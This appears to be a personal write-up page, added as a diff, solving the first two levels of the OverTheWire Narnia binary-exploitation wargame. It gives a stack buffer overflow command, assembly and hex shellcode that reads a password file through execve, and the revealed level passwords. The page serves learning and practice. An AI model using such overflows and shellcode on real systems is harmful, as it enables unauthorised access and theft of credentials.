@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+        <meta content="utf-8" http-equiv="encoding">   
+        <link rel="stylesheet" type="text/css" href="../stylesheet.css">
+    </head>
+    <body>
+    <title>OverTheWire Narnia</title>
+    <div id="navbar">
+        <div class="cube">
+            <div class="top"></div>
+            <div class="right"></div>
+            <div class="bottom"></div>
+            <div class="left"></div>
+            <div class="front"></div>
+            <div class="back"></div>
+          </div>
+        <a href="../../index.html">Home</a>
+        <a href="writeups.html">Writeups</a>
+    </div>
+    <script src="../stickyNav.js"></script>
+    <br>
+    <h1>OverTheWire Narnia</h1>
+    <hr />
+    <p>
+        Narnia is a series of wargames designed to teach basic binary exploitation. Most of the bugs in the game 
+        are easy to see or are common exploits that are easily researchable. We are also given the source code for each binary to spot the vulnerability and exploit it.
+    </p>
+    <br>
+    
+    <div class="c2">
+        All Narnia Levels:
+    <a href="#0to1">Level 0 to 1</a>
+    <a href="#1to2">Level 1 to 2</a>
+    <a href="#2to3">Level 2 to 3</a>
+    <a href="#3to4">Level 3 to 4</a>
+    <a href="#4to5">Level 4 to 5</a>
+    <a href="#5to6">Level 5 to 6</a>
+    <a href="#6to7">Level 6 to 7</a>
+    <a href="#6to7">Level 7 to 8</a>
+    <a href="#6to7">Level 8 to 9</a>
+    </div>
+    <br>
+
+    <a id="0to1"></a>
+    <h1>Level 0 to Level 1</h1><br>
+    <p>To get started, we ssh into <strong>narnia0</strong> at <strong>narnia.labs.overthewire.org</strong> at port <strong>2226</strong>. 
+    From there, in the <strong>/narnia</strong> folder, we see all the binaries and their source code. The only one we can access is <strong>narnia0 and narnia0.c</strong>.</p><br>
+    <p>Looking at the C file first, we see it tell us to change <strong>val</strong> from <strong>0x41414141</strong> to <strong>0xdeadbeef</strong> to get access to <strong>/etc/narnia_pass/narnia1</strong>. The 
+    only input have in the program is <strong>buf</strong>, a char array of length 20.</p><br>
+    <img src="../images/n0source.png"><br><br>
+    <p>We can see the vulnerability in the code. Namely the scanf function. We are scanning a line into <strong>buf</strong> of length 24, but <strong>buf</strong> is only of length 20. This means the last 4 chars scanned will overwrite memory in the stack.</p><br>
+    <p>We can verify this by looking at the dump of the binary file.</p><br>
+    <img src="../images/n0dump.png"><br><br>
+    <p>We can see at where <strong>var</strong> is pushed onto the stack at <strong>-0x8(%ebp)</strong></p><br>
+    <div class="boxed">
+        8048562:	c7 45 f8 41 41 41 41 	movl   $0x41414141,-0x8(%ebp)
+    </div><br>
+    <p>We can also find where the beginning of <strong>buf</strong> is located as one of the aguments loaded into the <strong>scanf</strong> function: </p><br>
+    <div class="boxed">
+        8048583:	8d 45 e4             	lea    -0x1c(%ebp),%eax
+    </div><br>
+    <p>This verifies that the length of <strong>buf</strong> is 20 as 0x1c - 0x8 = 0x14 or 20 in base 10, which is what we expected.</p><br>
+    <p>What we need to do is known as a buffer overflow exploit. This is when we write more data than expected into a buffer and overwrite specific areas of memory. 
+        We know that <strong>buf</strong> is 20 chars long, and that we are reading 24 chars. We also know that <strong>var</strong> contains 8 bytes, as it is a long type. 
+        So to finish the exploit, we can enter any 20 characters, and then write the bytes that make <strong>0xdeadbeef</strong> in reverse order, as the stack grows downward.
+        Another issue we can see from the source code is that we will call <strong>/bin/sh</strong> and it will exit immediately. To keep the terminal open, we also need to call <strong>cat</strong> with no arguments and it will pipe output to the terminal.
+        The full command looks like this:
+    </p><br>
+    <div class="boxed">
+        ( echo -e "AAAAAAAAAAAAAAAAAAAA\xEF\xBE\xAD\xDE" ; cat ) | ./narnia0
+    </div><br>
+    <img src="../images/n0pass.png"><br><br>
+    <p>So we have the password for level 1, <strong>efeidiedae</strong></p>
+    <hr />
+    <br>
+    <a id="1to2"></a>
+    <h1>Level 1 to Level 2</h1><br>
+    <p>For this level, we start by taking a look at <strong>narnia1.c</strong></p><br>
+    <img src="../images/n1Cfile.png"><br><br>
+    <p>We can see that whatever is in the environment variable <strong>EGG</strong>, the first value will overwrite <strong>RET</strong>,
+        This gives us the ability to control <strong>EIP</strong>, or the instruction pointer. 
+        When <strong>RET</strong> is read off the stack and placed into EIP, the instruction at the address will be executed.
+        So what we need to do is create injectable shellcode and store it in the environment variable <strong>EGG</strong>, then 
+        once <strong>RET</strong> is read off the stack, the next instruction will be at the beginning of our shellcode and will start to execute.
+    </p><br>
+    <p>Now for creating the shellcode. We first have to decide what is the exact thing we want the shellcode to do. For this challenge, 
+        we want to execute <strong>/bin/cat /etc/narnia_pass/narnia2</strong> in some way.
+    </p><br>
+    <p>The first step in creating shellcode is to create a simple C program that does what you want to do, analyze the instructions, and extract the opcodes that make the program run. The simplest way to 
+        create a new process in C is by using <strong>execve</strong>, this executes a program in place of the existing one. We can see how to execute <strong>/bin/cat /home/john/file1</strong>, which is a 
+        file containing Lorem Ipsum text, using <strong>execve</strong>.
+    </p><br>
+    <img src="../images/n1execve.png"><br><br>
+    <p>The <strong>execve</strong> call has a few arguments of interest</p><br>
+    <div class="boxed">
+        int execve(const char *filename, char *const argv[], char *const envp[]);
+    </div><br>
+    <p>We execute the program pointed to by <strong>filename</strong>, which must be a binary executable or executable script.
+    Second, <strong>argv</strong> is the array of argument strings passed to the new program, including the program name itsself. And 
+lastly, the argument <strong>envp</strong> is an array containing environment variables. This is not of interest to us now, so we leave that value as <strong>NULL</strong>.</p><br>
+    <p>To get started on the shellcode, we have to figure out how <strong>execve</strong> is called in assembly language. This is largely taken from Chapter 3 in "The Shellcoder's Handbook: Discovering and Exploiting Security Holes, Second Edition"</p><br>
+    <p>The first instruction of importance is loading the address of the <strong>/bin/cat</strong> string into the <strong>ebx</strong> register. Next we load the address of the argument array into the <strong>ecx</strong> register. 
+    Then, we place the address of <strong>envp</strong> into the <strong>edx</strong> register, which in our case is null. Lastly, we have to load the syscall number for <strong>execve</strong> into <strong>eax</strong>, which is 11. 
+The last step is to switch to kernel mode, executing the syscall in <strong>eax</strong>. We do this by using the <strong>int 0x80</strong> instruction.</p><br>
+    <p>What follows is the assembly code performing these instructions.</p><br>
+    <div class="boxed">
+        section .text
+        <p class="tab">global _start</p>
+        _start:<br>
+        <p class="tab">xor eax, eax</p>
+        <p class="tab">cdq</p>
+        <p class="tab">mov al, 0xb</p>
+        <p class="tab">push dword "/cat"</p>
+        <p class="tab">push dword "/bin"</p>
+        <p class="tab">mov ebx,esp</p>
+        <p class="tab">push edx</p>
+        <p class="tab">push dword "nia2"</p>
+        <p class="tab">push dword "/nar"</p>
+        <p class="tab">push dword "pass"</p>
+        <p class="tab">push dword "nia_"</p>
+        <p class="tab">push dword "/nar"</p>
+        <p class="tab">push dword "/etc"</p>
+        <p class="tab">mov ecx,esp</p>
+        <p class="tab">push edx</p>
+        <p class="tab">mov edx,esp</p>
+        <p class="tab">push ecx</p>
+        <p class="tab">push ebx</p>
+        <p class="tab">mov ecx,esp</p>
+        <p class="tab">int 0x80</p>
+    </div><br>
+    <p>We can save this as catFile.nasm. Then we have to assemble the file and extract the opcodes to create the finalized shellcode.</p><br>
+    <p>To assemble, we are going to use nasm.</p><br>
+    <div class="boxed">
+        nasm -o catFile -f elf32 -O0 catFile.nasm
+    </div><br>
+    <p>This gives us the assembled version of our nasm file in <strong>catFile</strong>. Next to get the opcodes, we dump the .text area of the elf binary file we created using <strong>objcopy</strong>, 
+    and then use <strong>od</strong> to read the dump in hex format.</p><br>
+    <div class="boxed">
+        objcopy -O binary -j .text catFile catFileHex<br>
+        od -An -t x1 catFileHex
+    </div><br>
+    <p>All together, these commands give us the opcodes we need for the injectable shellcode.</p><br>
+    <img src="../images/n1opcodes.png"><br><br>
+    <p>Finally, we set the environment variable <strong>EGG</strong> to be a string containing these values and run the executable.</p><br>
+    <div class="boxed">
+        (export EGG=`perl -e 'print("\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80")'` ; ./narnia1)
+    </div><br>
+    <img src="../images/n1final.png"><br><br>
+    <p>So we have th password to level 2 is <strong>nairiepecu</strong></p>
+    <hr />
+    <br>
+
+
+
+
+</body>
+</html>
